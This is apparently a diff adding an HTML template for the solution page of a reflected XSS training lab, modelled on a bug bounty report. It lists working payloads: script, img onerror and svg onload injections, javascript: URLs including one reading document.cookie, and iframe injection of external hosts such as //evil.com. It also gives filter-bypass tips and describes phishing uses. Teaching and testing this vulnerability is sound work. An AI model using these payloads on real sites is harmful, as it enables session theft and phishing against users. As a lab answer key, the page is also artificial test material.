@@ -1,0 +1,195 @@
+{% extends "base.html" %}
+
+{% block title %}Solution: Lab 03 - Reflected XSS in URL Parameter{% endblock %}
+
+{% block extra_css %}
+<style>
+    .solution-header {
+        background: linear-gradient(135deg, #238636 0%, #2ea043 100%);
+        padding: 30px;
+        border-radius: 8px;
+        margin-bottom: 30px;
+        color: white;
+    }
+    .solution-header h1 {
+        color: white;
+        margin-bottom: 10px;
+    }
+    .solution-header .lab-number {
+        background: rgba(255, 255, 255, 0.2);
+        padding: 5px 12px;
+        border-radius: 4px;
+        display: inline-block;
+        margin-bottom: 15px;
+    }
+    .objective-box {
+        background: #1c2128;
+        border-left: 4px solid #58a6ff;
+        padding: 20px;
+        margin: 20px 0;
+    }
+    .steps-box {
+        background: #0d1117;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 20px;
+        margin: 20px 0;
+    }
+    .steps-box ol {
+        margin-left: 20px;
+    }
+    .steps-box li {
+        margin-bottom: 10px;
+        line-height: 1.8;
+    }
+    .action-buttons {
+        display: flex;
+        gap: 15px;
+        margin-top: 30px;
+    }
+    .btn-secondary {
+        background: #30363d;
+        color: #c9d1d9;
+    }
+    .btn-secondary:hover {
+        background: #484f58;
+    }
+    .url-example {
+        background: #0d1117;
+        border: 1px solid #30363d;
+        border-radius: 6px;
+        padding: 15px;
+        margin: 10px 0;
+        font-family: 'Courier New', monospace;
+        word-break: break-all;
+        color: #58a6ff;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="solution-header">
+    <span class="lab-number">LAB 03 - SOLUTION</span>
+    <h1>Reflected XSS in URL Parameter</h1>
+    <p style="opacity: 0.9; font-size: 16px;">Based on Bug Bounty Report #2994788</p>
+</div>
+
+<div class="card">
+    <h2>📋 Lab Overview</h2>
+    <p>In this lab, you will exploit a <strong>Reflected Cross-Site Scripting (XSS)</strong> vulnerability where URL parameters are reflected directly in the page without sanitization. This type of XSS is commonly used in phishing attacks and social engineering scenarios.</p>
+    
+    <div class="objective-box">
+        <h3 style="color: #58a6ff; margin-bottom: 15px;">🎯 Learning Objectives</h3>
+        <ul style="margin-left: 20px;">
+            <li>Understand how reflected XSS attacks work</li>
+            <li>Learn to craft malicious URLs with XSS payloads</li>
+            <li>Test XSS in different contexts (direct reflection, iframe)</li>
+            <li>Understand phishing attack scenarios</li>
+            <li>Learn about URL parameter vulnerabilities</li>
+        </ul>
+    </div>
+
+    <div class="vulnerability-info">
+        <h3>🔴 Vulnerability Details</h3>
+        <p><strong>Type:</strong> Reflected XSS (Non-Persistent)</p>
+        <p><strong>Location:</strong> Help page at <code>/help</code> and <code>/Self-Signup/en_US/index.html</code></p>
+        <p><strong>Severity:</strong> Medium (6.1)</p>
+        <p><strong>Impact:</strong> Credential theft, phishing attacks, session hijacking</p>
+        <p><strong>Root Cause:</strong> URL parameters are reflected directly in the page without sanitization</p>
+    </div>
+</div>
+
+<div class="card">
+    <h2>📝 Step-by-Step Solution</h2>
+    
+    <div class="steps-box">
+        <h3 style="color: #f0f6fc; margin-bottom: 15px;">Step-by-Step Guide:</h3>
+        <ol>
+            <li><strong>Navigate to the Help page</strong> and observe the URL structure</li>
+            <li><strong>Add a URL parameter</strong> with a simple XSS payload</li>
+            <li><strong>Observe the reflection</strong> of your payload in the page</li>
+            <li><strong>Try different payloads</strong> to bypass potential filters</li>
+            <li><strong>Test the iframe injection</strong> scenario</li>
+            <li><strong>Try the self-signup endpoint</strong> with JavaScript protocol</li>
+            <li><strong>Create a phishing URL</strong> that could trick users</li>
+        </ol>
+    </div>
+
+    <div class="objective-box">
+        <h3 style="color: #58a6ff; margin-bottom: 15px;">💡 Solution & Payloads</h3>
+        <p><strong>Basic XSS Payload:</strong></p>
+        <div class="url-example">
+            /help?url=&lt;script&gt;alert('XSS')&lt;/script&gt;
+        </div>
+        
+        <p style="margin-top: 15px;"><strong>Iframe Injection - Start with help.html:</strong></p>
+        <div class="url-example">
+            /help?help.html
+        </div>
+        <p style="margin-top: 10px; font-size: 14px; color: #8b949e;">This shows an iframe with src="help.html". Now replace the value:</p>
+        
+        <p style="margin-top: 15px;"><strong>JavaScript Protocol Attack:</strong></p>
+        <div class="url-example">
+            /help?help.html=javascript:confirm(1)
+        </div>
+        
+        <p style="margin-top: 15px;"><strong>External URL Injection (from bug report):</strong></p>
+        <div class="url-example">
+            /help?help.html=https://shorturl.at/w82nn
+        </div>
+        
+        <p style="margin-top: 15px;"><strong>Alternative - Protocol-relative URL:</strong></p>
+        <div class="url-example">
+            /help?help.html=//evil.com
+        </div>
+        
+        <p style="margin-top: 15px;"><strong>Self-Signup Endpoint - JavaScript Protocol:</strong></p>
+        <div class="url-example">
+            /Self-Signup/en_US/index.html?url=javascript:confirm(1)
+        </div>
+        
+        <p style="margin-top: 15px;"><strong>Self-Signup Endpoint - Iframe Injection:</strong></p>
+        <div class="url-example">
+            /Self-Signup/en_US/index.html?url=https://shorturl.at/w82nn
+        </div>
+        
+        <p style="margin-top: 15px;"><strong>Alternative Payloads:</strong></p>
+        <div class="code-block">
+/help?q=&lt;script&gt;alert('XSS')&lt;/script&gt;<br>
+/help?url=&lt;img src=x onerror=alert('XSS')&gt;<br>
+/help?url=&lt;svg/onload=confirm(1)&gt;<br>
+/help?redirect=javascript:alert(document.cookie)
+        </div>
+    </div>
+</div>
+
+<div class="card">
+    <h2>🔍 Testing Tips</h2>
+    <ul style="margin-left: 20px; margin-top: 10px;">
+        <li>Try URL encoding your payload: <code>%3Cscript%3Ealert('XSS')%3C/script%3E</code></li>
+        <li>Test different parameter names: <code>url</code>, <code>redirect</code>, etc.</li>
+        <li>Observe how the payload is reflected in different parts of the page</li>
+        <li>Check if the payload works in an iframe context</li>
+        <li>Try combining with other attack vectors (e.g., phishing pages)</li>
+    </ul>
+</div>
+
+<div class="card">
+    <h2>✅ Success Criteria</h2>
+    <p>You have successfully completed this lab when:</p>
+    <ul style="margin-left: 20px; margin-top: 10px;">
+        <li>✓ You can execute JavaScript via URL parameters</li>
+        <li>✓ You understand the difference between stored and reflected XSS</li>
+        <li>✓ You can craft malicious URLs that execute XSS</li>
+        <li>✓ You've tested both endpoints (<code>/help</code> and <code>/Self-Signup/en_US/index.html</code>)</li>
+        <li>✓ You understand how this could be used in phishing attacks</li>
+    </ul>
+</div>
+
+<div class="action-buttons">
+    <a href="/help?q=getting-started" class="btn">Try the Lab →</a>
+    <a href="/Self-Signup/en_US/index.html?url=https://example.com" class="btn">Try Self-Signup →</a>
+    <a href="/" class="btn btn-secondary">← Back to Labs</a>
+</div>
+{% endblock %}
+
